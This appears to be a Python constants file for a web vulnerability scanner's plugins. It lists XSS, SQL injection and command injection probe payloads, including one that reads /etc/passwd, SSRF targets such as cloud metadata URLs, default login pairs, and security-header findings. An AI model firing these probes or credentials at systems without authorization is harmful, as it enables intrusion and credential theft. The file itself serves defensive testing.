"""Shared payload constants and utilities for scan plugins."""

from __future__ import annotations

# ---- XSS Payloads ----

XSS_BASIC_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
]

XSS_POLYGLOT = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"

# Canary for reflected XSS detection
XSS_CANARY_PREFIX = "d1m5um"

# ---- SQL Injection Payloads ----

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1' AND '1'='1",
    "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--",
]

SQLI_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error at or near",
    "pg_query",
    "mysql_fetch",
    "sqlite3.operationalerror",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "warning: mysql_",
    "valid mysql result",
    "mssql_query",
    "pg_exec",
    "syntax error in query expression",
]

# ---- Command Injection Payloads ----

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMDI_INDICATORS = [
    "uid=",
    "root:",
    "/bin/bash",
    "/bin/sh",
]

# ---- SSRF Payloads ----

SSRF_INTERNAL_URLS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
]

# ---- Default Credentials ----

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
]

# ---- Security Headers ----

EXPECTED_SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "medium",
        "description": "HTTP Strict-Transport-Security header is missing. This header tells browsers to only connect via HTTPS.",
        "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to responses.",
        "cwe_id": 523,
    },
    "X-Content-Type-Options": {
        "severity": "low",
        "description": "X-Content-Type-Options header is missing. This prevents MIME-type sniffing.",
        "remediation": "Add 'X-Content-Type-Options: nosniff' to responses.",
        "cwe_id": 693,
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "X-Frame-Options header is missing. This protects against clickjacking attacks.",
        "remediation": "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' to responses.",
        "cwe_id": 1021,
    },
    "Content-Security-Policy": {
        "severity": "medium",
        "description": "Content-Security-Policy header is missing. CSP helps prevent XSS and data injection attacks.",
        "remediation": "Implement a Content-Security-Policy header appropriate for your application.",
        "cwe_id": 693,
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Referrer-Policy header is missing. This controls how much referrer information is sent.",
        "remediation": "Add 'Referrer-Policy: strict-origin-when-cross-origin' to responses.",
        "cwe_id": 116,
    },
    "Permissions-Policy": {
        "severity": "low",
        "description": "Permissions-Policy header is missing. This controls browser feature access.",
        "remediation": "Add a Permissions-Policy header to restrict unnecessary browser features.",
        "cwe_id": 693,
    },
}

DANGEROUS_HEADERS = {
    "Server": {
        "severity": "info",
        "description": "Server header reveals web server software information.",
        "remediation": "Remove or obfuscate the Server header to reduce information disclosure.",
        "cwe_id": 200,
    },
    "X-Powered-By": {
        "severity": "info",
        "description": "X-Powered-By header reveals technology stack information.",
        "remediation": "Remove the X-Powered-By header to reduce information disclosure.",
        "cwe_id": 200,
    },
    "X-AspNet-Version": {
        "severity": "info",
        "description": "X-AspNet-Version header reveals ASP.NET version.",
        "remediation": "Remove the X-AspNet-Version header.",
        "cwe_id": 200,
    },
}
